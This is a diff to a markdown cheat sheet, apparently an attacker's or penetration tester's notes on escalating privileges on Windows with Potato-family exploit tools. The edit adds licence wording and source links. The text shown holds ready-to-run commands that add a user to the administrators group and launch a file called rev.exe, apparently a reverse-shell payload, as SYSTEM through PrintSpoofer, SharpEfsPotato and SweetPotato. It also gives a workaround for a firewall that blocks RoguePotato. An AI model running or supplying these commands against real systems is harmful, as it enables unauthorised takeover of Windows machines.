@@ -30,7 +30,7 @@ Or an administrator instead of a shell, when I know <Username>'s password:
 .\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators <Username> /add"
 
 ## The others
-JuicyPotato, RoguePotato, LocalPotato and CoercedPotato are in pwn-shop: tool install juicypotato, roguepotato, localpotato or coercedpotato, at the pwn-broker prompt. PrintSpoofer, SharpEfsPotato and SweetPotato are not redistributed: each goes in the target's upload/ folder first. All of them are fetched to C:\Users\Public.
+JuicyPotato, RoguePotato, LocalPotato and CoercedPotato are in pwn-shop: tool install juicypotato, roguepotato, localpotato or coercedpotato, at the pwn-broker prompt. PrintSpoofer, SharpEfsPotato and SweetPotato have no licence that lets pwn-shop carry them: each goes in the target's upload/ folder first, from the source its section names. All of them are fetched to C:\Users\Public.
 - [ ] Use the 64-bit build on 64-bit Windows
 
 ## CoercedPotato
@@ -83,6 +83,7 @@ cd C:\Users\Public
 - [ ] The target's firewall blocks 9999: RogueOxidResolver.exe -l 135 on a Windows machine I control, and -r pointed at it with no -l
 
 ## PrintSpoofer
+PrintSpoofer64.exe from https://github.com/itm4n/PrintSpoofer/releases
 Windows 10 and Server 2016 to 2019, with the Print Spooler running:
 sc.exe query Spooler
 .\PrintSpoofer64.exe -c "C:\Users\Public\rev.exe"
@@ -90,10 +91,12 @@ In a shell that keeps a console, such as a reverse shell:
 .\PrintSpoofer64.exe -i -c cmd
 
 ## SharpEfsPotato
+Built from https://github.com/bugch3ck/SharpEfsPotato, which publishes no binary.
 Through the EFS RPC interface, on current Windows:
 .\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\rev.exe"
 
 ## SweetPotato
+Built from https://github.com/CCob/SweetPotato, which publishes no binary.
 PrintSpoofer's method by default, or another with -e:
 .\SweetPotato.exe -p C:\Users\Public\rev.exe
 .\SweetPotato.exe -e EfsRpc -p C:\Users\Public\rev.exe
